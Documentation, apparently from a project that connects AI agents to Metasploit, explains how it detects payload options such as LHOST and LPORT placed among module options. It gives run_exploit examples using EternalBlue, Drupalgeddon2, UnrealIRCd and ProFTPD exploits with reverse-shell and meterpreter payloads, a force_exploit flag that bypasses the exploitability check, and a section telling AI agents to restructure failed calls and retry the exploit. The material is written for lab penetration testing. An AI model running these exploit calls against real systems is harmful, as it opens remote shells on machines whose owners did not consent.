# Intelligent Error Detection - Payload vs Module Options

## 🎯 Overview

MetasploitMCP now automatically detects when **payload options** (like `LHOST`, `LPORT`) are incorrectly provided as **module options**, and provides clear, actionable error messages to help you fix the configuration.

## 🔍 Problem This Solves

### AutoCheck Silent Abort

Metasploit modules frequently run `AutoCheck` before exploitation. For targets
that return ambiguous responses (common for web apps), the check can be
inconclusive and the exploit aborts with:

```
Cannot reliably check exploitability. "set ForceExploit true" to override check result.
```

MetasploitMCP now supports `force_exploit` in `run_exploit` to bypass this
gate when you intend to execute:

```python
await run_exploit(
    module="exploit/unix/webapp/drupal_drupalgeddon2",
    options={"RHOSTS": "192.168.1.50", "TARGETURI": "/"},
    payload="php/meterpreter/reverse_tcp",
    payload_options={"LHOST": "192.168.1.10", "LPORT": 4444},
    force_exploit=True,
)
```

### The Issue

When running exploits with `run_as_job=True` (RPC mode), Metasploit is stricter about option validation than console mode. A common mistake is passing payload options like `LHOST` and `LPORT` as module options:

```python
# ❌ WRONG: Payload options in module options
await run_exploit(
    module='exploit/unix/irc/unreal_ircd_3281_backdoor',
    options={
        'RHOSTS': '10.0.2.15',
        'RPORT': '6697',
        'LHOST': '10.0.0.1',  # ❌ This is a PAYLOAD option, not module option!
        'LPORT': 4444         # ❌ This is a PAYLOAD option, not module option!
    },
    payload='cmd/unix/reverse'
)
```

### Without Intelligent Detection

You would get a **cryptic error**:
```
KeyError: "Invalid option 'LHOST'."
```

### With Intelligent Detection ✅

You now get a **helpful, detailed error**:
```
❌ CONFIGURATION ERROR: Payload options (LHOST, LPORT) cannot be set on the exploit module.

These options belong to the PAYLOAD, not the exploit module 'exploit/unix/irc/unreal_ircd_3281_backdoor'.

🔧 How to fix:
1. Move LHOST, LPORT from 'options' to 'payload_options'
2. Keep module-specific options (RHOSTS, RPORT, etc.) in 'options'

Example:
  ✗ WRONG:
    run_exploit(
        module='exploit/unix/irc/unreal_ircd_3281_backdoor',
        options={'RHOSTS': '...', 'LHOST': '...', 'LPORT': ...},  # ❌ LHOST/LPORT here
        payload='...')

  ✓ CORRECT:
    run_exploit(
        module='exploit/unix/irc/unreal_ircd_3281_backdoor',
        options={'RHOSTS': '...', 'RPORT': ...},  # ✅ Module options only
        payload='...',
        payload_options={'LHOST': '...', 'LPORT': ...})  # ✅ Payload options separate
```

## 📋 How Detection Works

MetasploitMCP **queries Metasploit directly** for the valid options of both the module and the payload. This means:

- ✅ **100% accurate** - Always uses the actual valid options from Metasploit
- ✅ **Always up-to-date** - Automatically works with new modules and payloads
- ✅ **No hardcoded lists** - No need to maintain a list of payload options
- ✅ **Specific to your payload** - Checks against the exact payload you're using

### Detection Process

1. **Get Module Options**: Query `module_obj.options` to get all valid options for the exploit module
2. **Get Payload Options**: Query `payload_obj.options` to get all valid options for the payload
3. **Try to Set Options**: Attempt to set each option on the module
4. **Intelligent Error Handling**: If an option fails:
   - Check if it's valid for the payload → Payload option error (with helpful message)
   - Not valid for payload → Generic invalid option error (with list of valid options)

### Example Detection

For `exploit/unix/irc/unreal_ircd_3281_backdoor` with `cmd/unix/reverse`:

**Module Options** (queried from Metasploit):
- `RHOSTS`, `RPORT`, `CHOST`, `CPORT`, etc.

**Payload Options** (queried from Metasploit):
- `LHOST`, `LPORT`, `EXITFUNC`, `PrependSetuid`, etc.

If you try to set `LHOST` on the module, MetasploitMCP:
1. Sees it's not in the module's valid options
2. Checks if it's in the payload's valid options
3. Finds it IS a payload option
4. Provides the helpful "move from options to payload_options" error

## ✅ Correct Usage Examples

### Example 1: Simple Exploit

```python
await run_exploit(
    module='exploit/unix/ftp/proftpd_modcopy_exec',
    options={
        'RHOSTS': '10.0.2.15',
        'RPORT': '80',
        'RPORT_FTP': '21',
        'SITEPATH': '/var/www/html/',
        'TMPPATH': '/tmp'
    },
    payload='cmd/unix/reverse_perl',
    payload_options={
        'LHOST': '10.0.0.1',
        'LPORT': 4444
    }
)
```

### Example 2: With Advanced Payload Options

```python
await run_exploit(
    module='exploit/windows/smb/ms17_010_eternalblue',
    options={
        'RHOSTS': '192.168.1.10',
        'RPORT': 445
    },
    payload='windows/x64/meterpreter/reverse_tcp',
    payload_options={
        'LHOST': '192.168.1.5',
        'LPORT': 4444,
        'EXITFUNC': 'thread',
        'PrependMigrate': True,
        'AutoRunScript': 'migrate -n explorer.exe'
    }
)
```

### Example 3: Using Test Harness

```python
# In metasploitable3_test_harness.py
ExploitTest(
    name="UnrealIRCd Backdoor",
    module="exploit/unix/irc/unreal_ircd_3281_backdoor",
    payload="cmd/unix/reverse",
    options={
        "RHOSTS": "10.0.2.15",
        "RPORT": "6697"
        # ✅ LHOST/LPORT are extracted automatically and passed as payload_options
    }
)
```

## 🔧 How It Works

The intelligent error detection works by querying Metasploit directly:

1. **Query Module Options**: Before setting options, query `module_obj.options` to get all valid options for the exploit module
2. **Query Payload Options**: If a payload is specified, query `payload_obj.options` to get all valid options for the payload
3. **Option Setting**: Attempt to set each option on the exploit module
4. **Error Capture**: If an "Invalid option" error occurs, check if the option is valid for the payload
5. **Intelligent Classification**:
   - If option is valid for payload → Provide "move from options to payload_options" error with examples
   - If option is not valid for either → Provide "invalid option" error with list of valid module options
6. **Helpful Error**: Generate detailed, actionable error messages with actual option names from Metasploit

## 🎓 For AI Agents

When an AI agent receives this error, it should:

1. **Parse the error** to identify which options are misplaced (e.g., `LHOST`, `LPORT`)
2. **Restructure the call** by moving those options from `options` to `payload_options`
3. **Retry the exploit** with the corrected configuration

The error message is designed to be easily parseable and actionable for automated systems.

## 🧪 Testing

The feature is tested in:
- `tests/test_tools_integration.py` - Integration tests for exploit execution
- Automatically validates option placement during test execution
- No additional configuration required

## 📝 Notes

- This detection only activates when an actual error occurs (zero performance overhead for correct configs)
- The error is raised as a `ValueError` for easy catching and handling
- The feature works in both RPC mode (`run_as_job=True`) and console mode (`run_as_job=False`)
- The test harness (`metasploitable3_test_harness.py`) automatically separates payload options, so this error is less likely there

## 🔗 Related Documentation

- [Metasploitable3 Test Harness](../METASPLOITABLE3_HARNESS_README.md)
- [Port Availability Checking](PORT_AVAILABILITY_CHECK.md)
- [API Documentation](API.md)

